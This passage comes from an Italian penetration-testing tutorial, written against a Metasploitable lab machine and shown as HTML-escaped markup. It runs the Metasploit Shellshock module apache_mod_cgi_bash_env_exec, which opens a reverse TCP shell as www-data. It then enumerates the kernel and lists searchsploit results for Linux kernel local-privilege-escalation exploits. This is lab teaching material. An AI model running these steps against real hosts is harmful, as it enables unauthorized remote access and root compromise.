   LHOST  192.168.1.176    yes       The listen address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
   LPORT  &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   Linux x86

View the full module info with the info, or info -d command.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Alcuni moduli Metasploit hanno una piccola funzione utile che controllerà se il bersaglio è vulnerabile. Digitiamo &lt;strong&gt;check&lt;/strong&gt;, se il modulo lo consente, verranno visualizzate le informazioni sulla vulnerabilità o meno del bersaglio:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; check 
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.1.245:80 - The target is vulnerable.
msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Possiamo vedere che il bersaglio è davvero vulnerabile, quindi usiamo il comando &lt;strong&gt;exploit&lt;/strong&gt; per lanciare l&amp;rsquo;attacco. Viene aperta una sessione di shell e ora possiamo eseguire comandi come &lt;strong&gt;id&lt;/strong&gt; e &lt;strong&gt;whoami&lt;/strong&gt; per visualizzare le informazioni sull&amp;rsquo;utente corrente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; exploit 

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 192.168.1.176:4444 
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Command Stager progress - 100.00% &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1092/1092 bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sending stage &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; to 192.168.1.245
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Command shell session &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; opened &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.176:4444 -&amp;gt; 192.168.1.245:34196&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2023-07-18 22:19:53 +0200

id
uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;privilage-escalation&#34;&gt;Privilage Escalation&lt;/h1&gt;
&lt;p&gt;Useremo un exploit del kernel per aumentare i privilegi e ottenere il root, quindi prima dobbiamo trovare alcune informazioni sull&amp;rsquo;obiettivo. Poiché abbiamo già una shell, possiamo usare il comando &lt;strong&gt;uname -a&lt;/strong&gt; per visualizzare le informazioni del kernel sul sistema. Il comando &lt;strong&gt;lsb_release -a&lt;/strong&gt; è utile anche per scoprire quale distribuzione è in esecuzione e le relative informazioni sulla versione:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 exploit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multi/http/apache_mod_cgi_bash_env_exec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &amp;gt; exploit

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 192.168.1.176:4444 
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Command Stager progress - 100.00% &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1092/1092 bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sending stage &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; to 192.168.1.245
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Command shell session &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; opened &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.176:4444 -&amp;gt; 192.168.1.245:59113&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2023-07-18 22:46:43 +0200

id
uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
whoami
www-data
uname -a
Linux metasploitable 2.6.24-16-server &lt;span style=&#34;color:#75715e&#34;&gt;#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux&lt;/span&gt;
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 8.04
Release:        8.04
Codename:       hardy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Da qui, possiamo cercare un exploit da utilizzare. I comandi che abbiamo appena eseguito ci dicono che l&amp;rsquo;obiettivo esegue Ubuntu 8.04 con la versione del kernel 2.6.24. Kali contiene una versione locale di Exploit-DB, un database che contiene vari exploit, codici e pubblicazioni. Possiamo accedervi con uno strumento estremamente utile chiamato SearchSploit eseguendo il comando &lt;strong&gt;searchsploit&lt;/strong&gt; dal terminale:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;k0bra3390㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
└─$ searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6
Linux Kernel &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ldso_dynamic Stack Clash&amp;#39;&lt;/span&gt; Local Privilege Escalation                              | linux_x86/local/42276.c
Linux Kernel 2.2.25/2.4.24/2.6.2 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mremap()&amp;#39;&lt;/span&gt; Local Privilege Escalation                                                                                         | linux/local/160.c
Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                 | linux/local/22362.c
Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                 | linux/local/22363.c
Linux Kernel 2.4.1 &amp;lt; 2.4.37 / 2.6.1 &amp;lt; 2.6.32-rc5 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pipe.c&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                       | linux/local/9844.py
Linux Kernel 2.4.23/2.6.0 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;do_mremap()&amp;#39;&lt;/span&gt; Bound Checking Privilege Escalation                                                                                    | linux/local/145.c
Linux Kernel 2.4.30/2.6.11.5 - BlueTooth &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bluez_sock_create&amp;#39;&lt;/span&gt; Local Privilege Escalation                                                                          | linux/local/25289.c
Linux Kernel 2.4.4 &amp;lt; 2.4.37.4 / 2.6.0 &amp;lt; 2.6.30.4 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sendpage&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Metasploit&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                            | linux/local/19933.rb
Linux Kernel 2.4.x/2.6.x &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; SP2/11 / Ubuntu 8.10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;PPC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sock_sendpage()&amp;#39;&lt;/span&gt; Local Privilege Escalation                     | linux/local/9545.c
Linux Kernel 2.4.x/2.6.x - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Bluez&amp;#39;&lt;/span&gt; BlueTooth Signed Buffer Index Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                        | linux/local/926.c
Linux Kernel 2.4.x/2.6.x - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uselib()&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                             | linux/local/895.c
Linux Kernel 2.4.x/2.6.x - BlueTooth Signed Buffer Index Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                | linux/local/25288.c
Linux Kernel 2.4/2.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Fedora 11&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sock_sendpage()&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                              | linux/local/9598.txt
Linux Kernel 2.4/2.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RedHat Linux &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; / Fedora Core &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; / Whitebox &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; / CentOS 4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sock_sendpage()&amp;#39;&lt;/span&gt; Ring0 Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                            | linux/local/9479.c
Linux Kernel 2.4/2.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;x86-64&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - System Call Emulation Privilege Escalation                                                                                       | linux_x86-64/local/4460.c
Linux Kernel 2.4/2.6 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sock_sendpage()&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                          | linux/local/9641.txt
Linux Kernel 2.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian 4.0 / Ubuntu / Gentoo&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; UDEV &amp;lt; 1.4.1 - Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                    | linux/local/8478.sh
Linux Kernel 2.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Gentoo / Ubuntu 8.10/9.04&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; UDEV &amp;lt; 1.4.1 - Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                       | linux/local/8572.c
Linux Kernel 2.6 &amp;lt; 2.6.19 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;White Box &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip_append_data()&amp;#39;&lt;/span&gt; Ring0 Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                             | linux_x86/local/9542.c
Linux Kernel 2.6.0 &amp;lt; 2.6.31 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pipe.c&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                            | linux/local/33321.c
Linux Kernel 2.6.10 &amp;lt; 2.6.31.5 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pipe.c&amp;#39;&lt;/span&gt; Local Privilege Escalation                                                                                             | linux/local/40812.c
Linux Kernel 2.6.13 &amp;lt; 2.6.17.4 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;logrotate prctl()&amp;#39;&lt;/span&gt; Local Privilege Escalation                                                                                  | linux/local/2031.c
Linux Kernel 2.6.13 &amp;lt; 2.6.17.4 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sys_prctl()&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                    | linux/local/2004.c
Linux Kernel 2.6.13 &amp;lt; 2.6.17.4 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sys_prctl()&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                    | linux/local/2005.c
Linux Kernel 2.6.13 &amp;lt; 2.6.17.4 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sys_prctl()&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                    | linux/local/2006.c
Linux Kernel 2.6.13 &amp;lt; 2.6.17.4 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sys_prctl()&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                    | linux/local/2011.sh
Linux Kernel 2.6.17 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sys_Tee&amp;#39;&lt;/span&gt; Local Privilege Escalation                                                                                                       | linux/local/29714.txt
Linux Kernel 2.6.17 &amp;lt; 2.6.24.1 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;vmsplice&amp;#39;&lt;/span&gt; Local Privilege Escalation &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                       | linux/local/5092.c
Linux Kernel 2.6.17.4 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;proc&amp;#39;&lt;/span&gt; Local Privilege Escalation                                                                                                        | linux/local/2013.c
Linux Kernel 2.6.18 &amp;lt; 2.6.18-20 - Local Privilege Escalation                                                                                                     | linux/local/10613.c
Linux Kernel 2.6.19 &amp;lt; 5.9 - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Netfilter Local Privilege Escalation                                                                                                | linux/local/50135.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.22 &amp;lt; 3.9 (x86/x64) - &amp;#39;&lt;/span&gt;Dirty COW /proc/self/mem&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Race Condition Privilege Escalation (SUID Method)                                               | linux/local/40616.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.22 &amp;lt; 3.9 - &amp;#39;&lt;/span&gt;Dirty COW /proc/self/mem&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Race Condition Privilege Escalation (/etc/passwd Method)                                                  | linux/local/40847.cpp
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.22 &amp;lt; 3.9 - &amp;#39;&lt;/span&gt;Dirty COW&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;PTRACE_POKEDATA&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Race Condition Privilege Escalation (/etc/passwd Method)                                               | linux/local/40839.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.23 &amp;lt; 2.6.24 - &amp;#39;&lt;/span&gt;vmsplice&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (1)                                                                                         | linux/local/5093.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - &amp;#39;&lt;/span&gt;set_selection&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; UTF-8 Off-by-One Privilege Escalation              | linux_x86-64/local/9083.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.27 &amp;lt; 2.6.36 (RedHat x86-64) - &amp;#39;&lt;/span&gt;compat&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                               | linux_x86-64/local/15024.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.28/3.0 (DEC Alpha Linux) - Local Privilege Escalation                                                                                           | linux/local/17391.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.29 - &amp;#39;&lt;/span&gt;ptrace_attach&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Race Condition Privilege Escalation                                                                                      | linux/local/8678.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.30 &amp;lt; 2.6.30.1 / SELinux (RHEL 5) - Local Privilege Escalation                                                                                   | linux/local/9191.txt
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.32 (Ubuntu 10.04) - &amp;#39;&lt;/span&gt;/proc&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Handling SUID Privilege Escalation                                                                                  | linux/local/41770.txt
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.32 - &amp;#39;&lt;/span&gt;pipe.c&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (4)                                                                                                    | linux/local/10018.sh
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.32 &amp;lt; 3.x (CentOS 5/6) - &amp;#39;&lt;/span&gt;PERF_EVENTS&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (1)                                                                            | linux/local/25444.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.36-rc8 - &amp;#39;&lt;/span&gt;RDS Protocol&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                                              | linux/local/15285.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - &amp;#39;&lt;/span&gt;Full-Nelson.c&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                         | linux/local/15704.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.39 &amp;lt; 3.2.2 (Gentoo / Ubuntu x86/x64) - &amp;#39;&lt;/span&gt;Mempodipper&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (1)                                                             | linux/local/18411.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.39 &amp;lt; 3.2.2 (x86/x64) - &amp;#39;&lt;/span&gt;Mempodipper&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (2)                                                                             | linux/local/35161.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.9 &amp;lt; 2.6.11 (RHEL 4) - &amp;#39;&lt;/span&gt;SYS_EPoll_Wait&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Integer Overflow / Local Privilege Escalation                                                      | linux/local/1397.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.x (Gentoo 2.6.29rc1) - &amp;#39;&lt;/span&gt;ptrace_attach&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                               | linux/local/8673.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.x - &amp;#39;&lt;/span&gt;pipe.c&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (2)                                                                                                     | linux/local/33322.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.x - &amp;#39;&lt;/span&gt;SYS_EPoll_Wait&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Integer Overflow / Local Privilege Escalation (1)                                                                    | linux/local/25202.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.x - Ext4 &amp;#39;&lt;/span&gt;move extents&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; ioctl Privilege Escalation                                                                                              | linux/local/33395.txt
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.x - Ptrace Privilege Escalation                                                                                                                 | linux/local/30604.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - &amp;#39;&lt;/span&gt;Mutagen Astronomy&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                           | linux_x86-64/local/45516.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.11.5 - BlueTooth Stack Privilege Escalation                                                                                                   | linux/local/4756.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.19 (Debian 4) - &amp;#39;&lt;/span&gt;udp_sendmsg&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (3)                                                                                  | linux/local/9575.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.19 (x86/x64) - &amp;#39;&lt;/span&gt;udp_sendmsg&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation (2)                                                                                   | linux/local/9574.txt
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.22 - &amp;#39;&lt;/span&gt;ftruncate&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;open&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                                        | linux/local/6851.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.28 - &amp;#39;&lt;/span&gt;fasync_helper&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                                             | linux/local/33523.c
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Linux Kernel &amp;lt; 2.6.29 - &amp;#39;&lt;/span&gt;exit_notify&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; Local Privilege Escalation                                                                                               | linux/local/8369.sh
